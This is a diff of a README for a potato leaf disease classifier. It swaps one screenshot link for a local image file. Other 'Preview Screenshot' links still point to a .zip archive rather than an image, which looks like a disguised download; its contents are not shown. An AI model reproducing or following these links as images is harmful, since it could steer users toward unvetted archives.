@@ -15,7 +15,7 @@ This project is a web-based AI tool that classifies potato leaf images into **Ea
 
 ## 🖼️ UI Demo
 * **Select Image**:
-![Preview Screenshot](https://raw.githubusercontent.com/abdlkrim3/Potato-Leaf-Disease-Classifier/main/Arkab/Potato-Leaf-Disease-Classifier.zip)
+![Preview Screenshot](images/home.png)
 * **Image Selected**:
 ![Preview Screenshot](https://raw.githubusercontent.com/abdlkrim3/Potato-Leaf-Disease-Classifier/main/Arkab/Potato-Leaf-Disease-Classifier.zip)
 * **Result**:
